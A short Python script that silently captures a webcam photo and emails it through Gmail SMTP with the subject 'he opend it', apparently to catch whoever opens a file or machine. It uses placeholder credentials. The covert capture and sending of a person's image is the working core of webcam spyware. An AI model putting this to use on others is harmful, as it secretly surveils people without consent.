#!/usr/bin/python
import pygame.camera
pygame.camera.init()
cam = pygame.camera.Camera(pygame.camera.list_cameras()[0])
cam.start()
img = cam.get_image()
import pygame.image
pygame.image.save(img, "photo.bmp")
pygame.camera.quit()

import os
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart


def SendMail(ImgFileName):
    img_data = open(ImgFileName, 'rb').read()
    msg = MIMEMultipart()
    msg['Subject'] = 'he opend it'
    msg['From'] = '**from**@gmail.com'
    msg['To'] = '**to**@gmail.com'

    text = MIMEText("culprit")
    msg.attach(text)
    image = MIMEImage(img_data, name=os.path.basename(ImgFileName))
    msg.attach(image)

    s = smtplib.SMTP("smtp.gmail.com",587)
    s.ehlo()
    s.starttls()
    s.ehlo()
    s.login("****@gmail.com","**password**")
    s.sendmail("**from**@gmail.com","**to**@gmail.com", msg.as_string())
    s.quit()
SendMail('photo.bmp')
